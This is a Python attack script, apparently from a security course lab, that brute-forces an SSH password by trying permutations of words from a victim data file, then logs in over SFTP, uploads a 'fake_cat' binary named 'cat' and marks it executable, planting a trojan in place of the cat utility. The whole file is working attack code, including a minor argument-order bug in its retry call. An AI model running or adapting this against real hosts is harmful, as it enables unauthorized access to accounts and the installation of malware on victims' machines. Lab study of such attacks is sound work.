#!/usr/bin/env python3

# cat program -> /usr/bin/cat
# size = 43416 bytes
# ./crack_attack <Victim IP> <Attacker IP> <Attacker port>

import sys
import itertools
import paramiko
import time

usage_txt = "/crack_attack <Victim IP> <Attacker IP> <Attacker port>"
victim_ip = None
attack_ip = None
attack_pt = None
correct_password = None

def try_ssh_connection(hostname, username, password, port=22):
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		client.connect(hostname, port, username, password, timeout=3)
	except paramiko.AuthenticationException as authException:
		print(f"Auth Failed on {username} {password}")
		time.sleep(0.5)
		return False
	except paramiko.SSHException as sshException:
		# print(f"Unable to establish SSH connection: {sshException}")
		time.sleep(10)
		return try_ssh_connection(hostname, port, username, password)
	except:
		time.sleep(10)
		return False

	client.close()
	return True


def crack_ssh_password():
	global victim_ip, correct_password

	file_path = '/home/csc2022/materials/victim.dat'
	# file_path = './Test/test.dat'
	
	f = open(file_path)
	tmp = f.readlines()
	lin = [line.rstrip('\n') for line in tmp]
	
	for i in range(1, len(lin) + 1):
		for j in itertools.permutations(lin, i):
			now = ''.join(j)
			result = try_ssh_connection(
				hostname = victim_ip,
				username = 'csc2022',
				password = now
			)
			if result == True:
				correct_password = now
				print(f"Correct Password = {now}\n")
				return True
			time.sleep(0.5)
	return False


def download_virus(client):
	global correct_password, victim_ip

	print(f"Sending file to {victim_ip}")

	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(victim_ip, 22, 'csc2022', correct_password, timeout=3)
	sftp = client.open_sftp()
	
	localpath = './fake_cat'
	sftp.put(localpath, 'cat')
	sftp.close()
	
	client.exec_command('chmod +x cat')
	client.close()
	return


def main():
	global victim_ip, attack_ip, attack_pt

	try:
		victim_ip = sys.argv[1]
		attack_ip = sys.argv[2]
		attack_pt = sys.argv[3]
	except:
		pass
		print(f"Usage:\n{usage_txt}")
		return

	client = crack_ssh_password()
	if client != True:
		print('Crack Password Failed!')
		return

	download_virus(client)

	return 

if __name__ == '__main__':
    main()
